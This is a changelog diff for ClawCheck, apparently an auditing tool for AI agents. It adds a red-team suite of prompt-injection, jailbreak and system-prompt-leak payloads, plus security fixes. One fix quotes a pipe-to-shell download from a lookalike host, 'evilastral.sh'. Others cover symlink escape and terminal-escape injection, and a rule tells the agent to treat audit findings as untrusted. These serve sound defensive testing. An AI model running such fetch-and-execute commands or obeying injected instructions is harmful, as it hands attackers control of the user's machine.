@@ -3,6 +3,31 @@
 All notable changes to ClawCheck are documented here.
 Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).
 
+## [0.6.0] — 2026-06-19
+
+### Added
+- **Live red-team suite (`--redteam`).** A library of benign adversarial payloads
+  (prompt-injection, jailbreak, system-prompt-leak, tool-abuse, indirect-injection) to feed the
+  agent and check whether it obeys — the multi-scenario successor to `--canary`.
+- **HTML report (`--html PATH`).** A standalone, self-contained styled report (owner view;
+  HTML-escaped; marked private).
+
+### Security (hardening from an external review)
+- **Allowlist suffix bypass fixed.** `curl https://evilastral.sh/... | sh` is no longer treated
+  as the reputable `astral.sh` — only exact host or real subdomain matches now (B13).
+- **Symlink escape blocked.** The installed-skill reader skips symlinks and refuses any path that
+  resolves outside the skill directory, so a skill can't make the auditor read other files.
+- **Report output is sanitised.** Findings/skill-names/payload previews (untrusted data) are
+  stripped of ANSI/OSC (incl. OSC-52 clipboard), bidi-override and zero-width characters.
+- **Random canary token** by default (was deterministic), so an agent can't be pre-trained on it.
+- **Monitor state** is written `chmod 600`.
+- **SKILL.md** now tells the agent to treat audit output as untrusted data (never follow
+  instructions inside findings) and accurately states what files are read.
+
+### Fixed
+- **C3 (backups) was declared in the catalog but never run** — now registered, with a test that
+  fails if any catalog entry is left unregistered.
+
 ## [0.5.0] — 2026-06-19
 
 ### Added
